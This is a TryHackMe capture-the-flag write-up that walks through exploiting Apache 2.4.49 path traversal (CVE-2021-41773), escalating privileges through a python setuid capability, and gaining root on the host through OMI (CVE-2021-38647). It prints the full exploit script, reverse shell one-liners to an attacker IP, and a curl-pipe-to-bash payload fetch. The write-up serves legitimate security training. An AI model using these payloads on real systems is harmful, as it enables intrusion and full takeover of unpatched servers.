# TryHackMe-Oh My WebServer

**Scope:**

- Open Management Infrastructure (OMI)
- Linux Capabilities

**Keywords:**

- Directory Scan
- Apache 2.4.49
- Path Traversal Phase
- Remode Code Execution
- Python Capabilities
- OMI Exploitation
- Nmap Binary

**Main Commands:**

- `nmap -sSVC -oN nmap_result.txt -A -O -Pn -F $target_ip`
- `wfuzz -u http://ohmyweb.thm/FUZZ -w /usr/share/wordlists/dirb/common.txt --hc 404,500,501,502,503 -c -t 50 -L`
- `searchsploit 'Apache 2.4.49'`
- `searchsploit -m multiple/webapps/50383.sh`
- `curl -skL -X GET 'http://ohmyweb.thm/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; whoami && pwd && id' -H "Content-Type: text/plain"`
- `bash 50383.sh targets.txt '/bin/sh' "cat /etc/passwd"`
- `curl -skL -X GET 'http://ohmyweb.thm/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/10.2.37.37/11143 0>&1' -H "Content-Type: text/plain"`

**System Commands:**

- `python3 exploit.py -t 172.17.0.1 -c 'curl http://10.2.37.37:8000/reversebash.sh | bash'`
- `python3 exploit.py -t 172.17.0.1 -c 'whoami;pwd;id;hostname;uname -a'`
- `curl http://10.2.37.37:8000/nmap -o nmap`
- `netstat -tulwn`
- `ifconfig`
- `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
- `getcap -r / 2>/dev/null`
- `getent group daemon`
- `SHELL=/bin/bash script -q /dev/null`
- `export TERM=xterm`

### Laboratory Environment

[Oh My WebServer](https://tryhackme.com/r/room/ohmyweb)

### Penetration Approaches and Commands

> **Network Enumeration Phase**
> 

`nmap -sSVC -oN nmap_result.txt -A -O -Pn -F $target_ip`

```jsx
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e0:d1:88:76:2a:93:79:d3:91:04:6d:25:16:0e:56:d4 (RSA)
|   256 91:18:5c:2c:5e:f8:99:3c:9a:1f:04:24:30:0e:aa:9b (ECDSA)
|_  256 d1:63:2a:36:dd:94:cf:3c:57:3e:8a:e8:85:00:ca:f6 (ED25519)
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.49 (Unix)
|_http-title: Consult - Business Consultancy Agency Template | Home
```

> **HTTP Port Check**
> 

`curl -iLX GET -D response.txt http://ohmyweb.thm`

```jsx
HTTP/1.1 200 OK
Date: Fri, 22 Nov 2024 08:54:49 GMT
Server: Apache/2.4.49 (Unix)
Last-Modified: Wed, 23 Feb 2022 05:40:45 GMT
ETag: "e281-5d8a8e82e3140"
Accept-Ranges: bytes
Content-Length: 57985
Content-Type: text/html

[REDACTED] - MORE
```

> **Directory Scan & Endpoint Control Phase**
> 

`wfuzz -u http://ohmyweb.thm/FUZZ -w /usr/share/wordlists/dirb/common.txt --hc 404,500,501,502,503 -c -t 50 -L`

```jsx
000000011:   403        7 L      20 W       199 Ch      ".hta"                                                
000000013:   403        7 L      20 W       199 Ch      ".htpasswd"                                           
000000012:   403        7 L      20 W       199 Ch      ".htaccess"                                           
000000001:   200        1029 L   3224 W     57985 Ch    "http://ohmyweb.thm/"                                 
000000499:   200        15 L     38 W       404 Ch      "assets"                                              
000000820:   403        7 L      20 W       199 Ch      "cgi-bin/"                                            
000002020:   200        1029 L   3224 W     57985 Ch    "index.html"
```

`wfuzz -u http://ohmyweb.thm/cgi-bin/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404,500,501,502,503 -c -t 50 -L`

```jsx
000045226:   403        7 L      20 W       199 Ch      "http://ohmyweb.thm/cgi-bin/" 
```

> **Exploitation Search Phase**
> 

**For more information:**

[Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)](https://www.exploit-db.com/exploits/50383)

`searchsploit 'Apache 2.4.49'`

```jsx
Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)             | multiple/webapps/50383.sh
```

`searchsploit -m multiple/webapps/50383.sh`

```jsx
  Exploit: Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/50383
     Path: /usr/share/exploitdb/exploits/multiple/webapps/50383.sh
    Codes: CVE-2021-41773
 Verified: True
File Type: ASCII text
Copied to: /root/Desktop/CyberLearningFramework/ohmyweb/50383.sh
```

`cat 50383.sh`

```jsx
# Credits: Ash Daulton and the cPanel Security Team

#!/bin/bash

if [[ $1 == '' ]]; [[ $2 == '' ]]; then
echo Set [TAGET-LIST.TXT] [PATH] [COMMAND]
echo ./PoC.sh targets.txt /etc/passwd
exit
fi
for host in $(cat $1); do
echo $host
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $3" "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e$2"; done

# PoC.sh targets.txt /etc/passwd
# PoC.sh targets.txt /bin/sh whoami 
```

> **Remode Code Execution with Path Traversal & Reverse Shell Phase**
> 

`curl -skL -X GET 'http://ohmyweb.thm/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; whoami && pwd && id' -H "Content-Type: text/plain"` 

```jsx
daemon
/bin
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

`curl -skL -X GET 'http://ohmyweb.thm/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; which python3' -H "Content-Type: text/plain"`

```jsx
/usr/bin/python3
```

`nano targets.txt`

```jsx
10.10.65.171
```

`chmod +x 50383.sh`

`bash 50383.sh targets.txt '/bin/sh' "cat /etc/passwd"`

```jsx
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
```

`nano revshell.txt`

```jsx
bash -i >& /dev/tcp/10.2.37.37/11143 0>&1
```

`nc -nlvp 11143`

```jsx
listening on [any] 11143 ...
```

`curl -skL -X GET 'http://ohmyweb.thm/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/10.2.37.37/11143 0>&1' -H "Content-Type: text/plain"`

```jsx
listening on [any] 11143 ...
connect to [10.2.37.37] from (UNKNOWN) [10.10.65.171] 58348
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell

daemon@4a70924bafa0:/bin$ whoami
daemon
daemon@4a70924bafa0:/bin$ pwd 
/bin
daemon@4a70924bafa0:/bin$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)

daemon@4a70924bafa0:/bin$ SHELL=/bin/bash script -q /dev/null
daemon@4a70924bafa0:/bin$ export TERM=xterm

daemon@4a70924bafa0:/bin$ uname -a
Linux 4a70924bafa0 5.4.0-88-generic #99-Ubuntu SMP Thu Sep 23 17:29:00 UTC 2021 x86_64 GNU/Linux
daemon@4a70924bafa0:/bin$ dpkg --version
Debian 'dpkg' package management program version 1.19.7 (amd64).
This is free software; see the GNU General Public License version 2 or
later for copying conditions. There is NO warranty.

daemon@4a70924bafa0:/bin$ groups
daemon
daemon@4a70924bafa0:/bin$ getent group daemon
daemon:x:1:
daemon@4a70924bafa0:/bin$ 
```

> **Privilege Escalation with Capabilities**
> 

**For more information:**

[Linux Capabilities | HackTricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities)

[python
            
            |
            
            GTFOBins](https://gtfobins.github.io/gtfobins/python/)

```jsx
daemon@4a70924bafa0:/bin$ getcap -r / 2>/dev/null
/usr/bin/python3.7 = cap_setuid+ep

daemon@4a70924bafa0:/bin$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

root@4a70924bafa0:/bin# whoami
root

root@4a70924bafa0:/bin# cat /etc/hosts
cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.2      4a70924bafa0

root@4a70924bafa0:/bin# ifconfig

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
        RX packets 176830  bytes 34415605 (32.8 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 175361  bytes 70168847 (66.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@4a70924bafa0:/bin# netstat -tulwn

Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN   
  
root@4a70924bafa0:/bin#
```

> **Internal Network Enumeration & Gaining Access with OMI Exploitation Phase**
> 

**For more information:**

[5985,5986 - Pentesting OMI | HackTricks](https://book.hacktricks.xyz/pentesting/5985-5986-pentesting-omi)

`wget https://github.com/andrew-d/static-binaries/raw/refs/heads/master/binaries/linux/x86_64/nmap`

```jsx
nmap                          100%[================================================>]   5.67M  4.38MB/s    in 1.3s    

2024-11-22 04:36:54 (4.38 MB/s) - ‘nmap’ saved [5944464/5944464]

```

**For source:**

[https://github.com/andrew-d/static-binaries/](https://github.com/andrew-d/static-binaries/)

`python3 -m http.server 8000`

```jsx
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```jsx
root@4a70924bafa0:/bin# cd /tmp
root@4a70924bafa0:/tmp# curl http://10.2.37.37:8000/nmap -o nmap
root@4a70924bafa0:/tmp# chmod +x nmap
root@4a70924bafa0:/tmp# ./nmap -p- --min-rate 1000 172.17.0.1 -oN nmap_result.txt

PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
5985/tcp closed unknown
5986/tcp open   unknown
MAC Address: 02:42:3D:F2:74:61 (Unknown)

root@4a70924bafa0:/tmp#
```

`wget https://raw.githubusercontent.com/AlteredSecurity/CVE-2021-38647/refs/heads/main/CVE-2021-38647.py`

```jsx
CVE-2021-38647.py             100%[================================================>]   5.12K  --.-KB/s    in 0.002s  

2024-11-22 04:45:17 (2.45 MB/s) - ‘CVE-2021-38647.py’ saved [5246/5246]
```

**For source:**

[https://github.com/AlteredSecurity/CVE-2021-38647/](https://github.com/AlteredSecurity/CVE-2021-38647/)

`cp CVE-2021-38647.py exploit.py`

```jsx
root@4a70924bafa0:/tmp# curl http://10.2.37.37:8000/exploit.py -o exploit.py
root@4a70924bafa0:/tmp# python3 exploit.py -t 172.17.0.1 -c 'whoami;pwd;id;hostname;uname -a'

root
/var/opt/microsoft/scx/tmp
uid=0(root) gid=0(root) groups=0(root)
ubuntu
Linux ubuntu 5.4.0-88-generic #99-Ubuntu SMP Thu Sep 23 17:29:00 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux

root@4a70924bafa0:/tmp# 
```

`nano reversebash.sh`

```jsx
bash -i >& /dev/tcp/10.2.37.37/10001 0>&1
```

`nc -nlvp 10001`

```jsx
listening on [any] 10001 ...
```

```jsx
root@4a70924bafa0:/tmp# python3 exploit.py -t 172.17.0.1 -c 'curl http://10.2.37.37:8000/reversebash.sh | bash'
```

```jsx
listening on [any] 10001 ...
connect to [10.2.37.37] from (UNKNOWN) [10.10.65.171] 36716
bash: cannot set terminal process group (1799): Inappropriate ioctl for device
bash: no job control in this shell

root@ubuntu:/var/opt/microsoft/scx/tmp# whoami
root
root@ubuntu:/var/opt/microsoft/scx/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:/var/opt/microsoft/scx/tmp# 

```

# Appendix

## Open Management Infrastructure (OMI)

<aside>
💡

OMI, or Open Management Infrastructure, is a lightweight and open-source management framework developed by Microsoft. It is primarily used for managing and monitoring server environments in a standardized and scalable way, particularly in cloud and hybrid cloud deployments. OMI serves as a Linux and UNIX equivalent of Windows Management Instrumentation (WMI) and is designed to facilitate management tasks, like querying system configurations, monitoring performance metrics, and automating administrative processes. It is a part of Microsoft’s efforts to provide consistent management tools across different operating systems.

</aside>

## Linux Capabilities

<aside>
💡

Linux Capabilities are a fine-grained access control mechanism that breaks down the privileges traditionally associated with the root user into distinct units, called capabilities. Instead of granting a process full root privileges, specific capabilities can be assigned to limit the process's power while still allowing it to perform certain privileged operations.

</aside>